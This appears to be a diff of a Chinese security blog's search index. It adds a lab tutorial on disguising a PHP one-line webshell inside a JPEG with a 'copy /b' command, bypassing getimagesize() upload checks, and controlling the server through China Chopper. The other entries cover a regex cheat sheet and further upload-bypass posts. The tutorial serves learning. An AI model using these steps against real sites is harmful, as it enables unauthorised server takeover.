+    <url>/blog/2021/12/27/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/</url>
+    <content><![CDATA[<h2 id="图片木马绕过文件内容检测上传webshell"><a href="#图片木马绕过文件内容检测上传webshell" class="headerlink" title="图片木马绕过文件内容检测上传webshell"></a>图片木马绕过文件内容检测上传webshell</h2><p>目的：</p>
+<ul>
+<li>理解绕过内容验证上传的原理</li>
+<li>学习绕过内容验证上传的过程</li>
+</ul>
+<p>原理</p>
+<ul>
+<li>一般文件内容验证使用getimagesize()函数检测，会判断文件是否是一个有效的文件图片，如果是，则允许上传，否则的话不允许上传</li>
+<li>本实例就是将一句话木马插入到一个【合法】的图片文件当中，然后用中国菜刀远程连接</li>
+</ul>
+<p>过程：</p>
+<ul>
+<li>打开火狐，进入网址<a href="http://192.168.1.3:8080/up%EF%BC%8C%E8%BF%9B%E5%85%A5%E6%9E%84%E9%80%A0%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0webshell![image-20211228104158522](https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104158522.png)">http://192.168.1.3:8080/up，进入构造图片马绕过上传webshell![image-20211228104158522](https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104158522.png)</a></li>
+<li>选择上传木马，后缀php改为php.jpg</li>
+<li>点击上传，提示错误</li>
+<li><img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104300084.png" alt="image-20211228104300084"></li>
+<li>制作图片马，将要上传的木马与图片一个文件下<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104350818.png" alt="image-20211228104350818"></li>
+<li>打开cmd，进入对应目录<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104423625.png" alt="image-20211228104423625"></li>
+<li>输入copy pic.jpg/b+lubr.php/a PicLubr.jpg，将lubr.php插入到pic.jpg中<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104518932.png" alt="image-20211228104518932"></li>
+<li>在火狐上传PicLubr.jpg，后缀名改为PicLubr.jpg.php，然后上传<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104707308.png" alt="image-20211228104707308"></li>
+<li>输入连接访问木马文件<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104737829.png" alt="image-20211228104737829"></li>
+<li>打开中国菜刀，添加木马连接，输入密码lubr，脚本类型php(eval)</li>
+<li>双击添加的shell，即可访问网站的完整目录<img src="https://gitee.com/oxchang/img-host/raw/master/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228104832489.png" alt="image-20211228104832489"></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>webshell</tag>
+        <tag>图片木马</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>常用工具</title>
-    <url>/2021/11/24/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
+    <url>/blog/2021/11/24/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
     <content><![CDATA[<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><p>图片隐写：zsteg，stegslove，outguess，pngcheck。</p>
 ]]></content>
       <tags>
@@ -1024,8 +1139,27 @@
       </tags>
   </entry>
   <entry>
+    <title>正则表达式</title>
+    <url>/blog/2021/11/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
+    <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>.表示任意单个字符（除了换行符）</p>
+<p>[]表示里面的任何一个字符</p>
+<p>a{1，5}表示a有1到5之间个字符</p>
+<p>{0，}表示0个或者无穷个</p>
+<p>*表示{0，}</p>
+<p>+表示{1，}</p>
+<p>？表示{0，1}</p>
+<p>[^a,b,c]表示除了a,b,c的其他字符</p>
+<p>^是字符串开头</p>
+<p>$是字符串结尾</p>
+<p>（？&lt;=（a））表示以a开头</p>
+<p>（？=（a））表示以a结尾</p>
+<p>\d , \w  , \ s 匹配数字，字符，空格</p>
+<p>\D , \W  ,\S 匹配非数字，非字符，非空格</p>
+]]></content>
+  </entry>
+  <entry>
     <title>绕过content_type检测文件类型上传webshell</title>
-    <url>/2021/12/27/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/</url>
+    <url>/blog/2021/12/27/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/</url>
     <content><![CDATA[<h2 id="绕过content-type检测文件类型上传webshell"><a href="#绕过content-type检测文件类型上传webshell" class="headerlink" title="绕过content_type检测文件类型上传webshell"></a>绕过content_type检测文件类型上传webshell</h2><p>目的:</p>
 <ul>
 <li>理解绕过Content-Type检测文件类型上传的原理</li>
@@ -1066,27 +1200,8 @@
       </tags>
   </entry>
   <entry>
-    <title>正则表达式</title>
-    <url>/2021/11/24/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
-    <content><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>.表示任意单个字符（除了换行符）</p>
-<p>[]表示里面的任何一个字符</p>
-<p>a{1，5}表示a有1到5之间个字符</p>
-<p>{0，}表示0个或者无穷个</p>
-<p>*表示{0，}</p>
-<p>+表示{1，}</p>
-<p>？表示{0，1}</p>
-<p>[^a,b,c]表示除了a,b,c的其他字符</p>
-<p>^是字符串开头</p>
-<p>$是字符串结尾</p>
-<p>（？&lt;=（a））表示以a开头</p>
-<p>（？=（a））表示以a结尾</p>
-<p>\d , \w  , \ s 匹配数字，字符，空格</p>
-<p>\D , \W  ,\S 匹配非数字，非字符，非空格</p>
-]]></content>
-  </entry>
-  <entry>
     <title>绕过前台脚本检测扩展名上传webshell</title>
-    <url>/2021/12/27/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/</url>
+    <url>/blog/2021/12/27/%E7%BB%95%E8%BF%87%E5%89%8D%E5%8F%B0%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%8A%E4%BC%A0webshell/</url>
     <content><![CDATA[<p>目的：</p>
 <ul>
 <li>理解绕过前台脚本检测扩展名上传的原理 </li>
@@ -1151,7 +1266,7 @@
   </entry>
   <entry>
     <title>进程间Messenger通信</title>
-    <url>/2021/12/27/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/</url>
+    <url>/blog/2021/12/27/%E8%BF%9B%E7%A8%8B%E9%97%B4Messenger%E9%80%9A%E4%BF%A1/</url>
     <content><![CDATA[<h2 id="进程间Messenger通信"><a href="#进程间Messenger通信" class="headerlink" title="进程间Messenger通信"></a>进程间Messenger通信</h2><p>目的：</p>
 <ul>
 <li>通过JAVA编程理解Android进程通信</li>
